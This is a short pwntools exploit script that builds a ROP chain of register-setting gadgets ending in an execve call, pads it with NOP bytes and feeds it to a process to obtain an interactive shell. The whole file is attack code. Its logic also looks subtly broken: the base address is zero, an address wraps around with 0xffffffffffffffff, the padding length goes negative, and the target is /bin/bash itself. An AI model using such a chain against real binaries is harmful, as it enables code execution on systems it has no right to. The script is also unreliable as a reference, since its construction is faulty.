from pwn import *
import os 



code_base = 0x0         # base address of the binary
chain = b""
chain += p64(code_base + 0xc7e08)   # pop rax; ret
chain += p64(code_base + 0xffffffffffffffff)
chain += p64(code_base + 0x602f9)   # gadget
chain += p64(0x0)
chain += p64(code_base + 0x40532)   # pop rsi; ret
chain += p64(code_base + 0x0)
chain += p64(code_base + 0x410c2)   # pop rdi; ret
chain += p64(code_base + 0x32345)
chain += p64(code_base + 0x2f470)   # execve@plt

padding = b"\x90" * (64 - len(chain))
payload = padding + chain

proc = process(["/bin/bash"])
proc.sendline(payload)
proc.interactive()